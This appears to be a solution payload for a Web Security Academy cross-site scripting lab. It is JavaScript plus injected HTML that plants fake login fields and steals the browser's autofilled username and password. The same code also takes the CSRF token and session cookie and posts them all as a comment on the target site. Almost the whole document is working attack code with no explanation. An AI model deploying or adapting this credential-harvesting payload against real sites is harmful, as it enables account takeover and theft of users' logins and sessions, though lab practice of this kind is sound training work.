function attack() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://0a330051042d654c8536c210005500b7.web-security-academy.net/post/comment", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    
    var csrfToken = document.querySelector('input[name="csrf"]').value; // This token value can change, ensure you get the right value dynamically if needed.
    var pass = document.querySelector('input[name="password"]').value; // This token value can change, ensure you get the right value dynamically if needed.
    var user = document.querySelector('input[name="username"]').value; // This token value can change, ensure you get the right value dynamically if needed.
    var body = "csrf=" + encodeURIComponent(csrfToken) +
               "&postId=8" +
               "&comment=" + encodeURIComponent("csrf is" + csrfToken +"cookie" + document.cookie + "pass" + pass +"user" + user) + 
               "&name=test" +
               "&email=s%40g" +
               "&website=https%3A%2F%2Ff.com";
    
    // Send the request
    xhr.send(body);
    }


    ```final payload
    <input name=username id=username>
<input type=password name=password onchange="if(this.value.length)attack()">
<script>
    function attack() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://0a330051042d654c8536c210005500b7.web-security-academy.net/post/comment", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    
    var csrfToken = document.querySelector('input[name="csrf"]').value; // This token value can change, ensure you get the right value dynamically if needed.
    var pass = document.querySelector('input[name="password"]').value; // This token value can change, ensure you get the right value dynamically if needed.
    var user = document.querySelector('input[name="username"]').value; // This token value can change, ensure you get the right value dynamically if needed.
    var body = "csrf=" + encodeURIComponent(csrfToken) +
               "&postId=8" +
               "&comment=" + encodeURIComponent("csrf is" + csrfToken +"cookie" + document.cookie + "pass" + pass +"user" + user) + 
               "&name=test" +
               "&email=s%40g" +
               "&website=https%3A%2F%2Ff.com";
    
    // Send the request
    xhr.send(body);
    }
</script>
    ```